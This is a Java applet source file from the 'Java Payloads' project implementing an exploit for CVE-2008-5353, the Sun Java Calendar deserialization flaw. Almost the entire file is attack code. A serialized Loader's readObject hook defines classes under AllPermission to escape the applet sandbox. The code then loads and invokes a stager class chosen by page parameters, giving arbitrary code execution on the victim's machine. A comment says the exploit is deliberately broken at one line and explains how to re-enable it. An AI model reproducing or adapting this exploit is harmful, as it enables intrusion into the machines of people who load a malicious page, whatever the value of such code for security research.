/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

/*
 * Sun Java Calendar Object Serialization Exploit (CVE-2008-5353)
 * based on <http://blog.cr0.org/2009/05/write-once-own-everyone.html>
 * and <http://landonf.bikemonkey.org/code/macosx/CVE-2008-5353.20090519.html>
 * 
 * This version does not work out of the box: see line 69 for how to reenable it.
 */

package javapayload.loader;

import java.applet.Applet;
import java.io.*;
import java.net.*;
import java.security.*;
import java.security.cert.Certificate;

public class CVE_2008_5353 extends Applet implements PrivilegedExceptionAction {

	public static Applet instance;

	public void init() {
		instance = this;
		try {
 			new ObjectInputStream(getClass().getResourceAsStream("/x")).readObject();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void go(Applet originalInstance) throws Exception {
		instance = originalInstance;
		// you will have to change the line below so that it will
		// actually run the privileged exception action while ignoring
		// the privileges of our caller (the applet):
		((PrivilegedExceptionAction)this).run();
	}

	public Object run() throws Exception {
		final String[] args = new String[Integer.parseInt(instance.getParameter("argc"))];
		for (int i = 0; i < args.length; i++) {
			args[i] = instance.getParameter("arg" + i);
		}
		URLClassLoader originalOne = (URLClassLoader)instance.getClass().getClassLoader();
		URLClassLoader newOne = new MyURLClassLoader(originalOne.getURLs());
		final Object stager = newOne.loadClass("javapayload.stager." + args[0]).newInstance();
		stager.getClass().getMethod("bootstrap", new Class[] {String[].class}).invoke(stager, new Object[] {args});
		return null;
	}

	public static void copyStream(InputStream in, OutputStream out) throws Exception {
		byte[] bs = new byte[4096];
		int len;
		while((len = in.read(bs)) != -1) 
			out.write(bs, 0, len);
		in.close();
		out.close();
	}
	
	public static class Loader extends ClassLoader implements Serializable {

		private void readObject(ObjectInputStream ois) {
			try {
				String className = MyURLClassLoader.class.getName();
				InputStream in = getClass().getResourceAsStream("/"+className.replace('.','/')+".class");
				ByteArrayOutputStream baos = new ByteArrayOutputStream();
				copyStream(in, baos);
				Permissions permissions = new Permissions();
				permissions.add(new AllPermission());
				defineClass(className, baos.toByteArray(), 0, baos.size(), new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions));
				className = CVE_2008_5353.class.getName();
				in = getClass().getResourceAsStream("/"+className.replace('.','/')+".class");
				baos = new ByteArrayOutputStream();
				copyStream(in, baos);
				Class c = defineClass(className, baos.toByteArray(), 0, baos.size(), new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions));
				c.getMethod("go", new Class[] {Applet.class}).invoke(c.newInstance(), new Object[] {instance});
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}
	
	public static class MyURLClassLoader extends URLClassLoader {
		public MyURLClassLoader(URL[] urls) {
			super(urls);
		}
		
		protected PermissionCollection getPermissions(CodeSource codesource) {
			PermissionCollection baseCollection = super.getPermissions(codesource);
			baseCollection.add(new AllPermission());
			return baseCollection;
		}
	}
}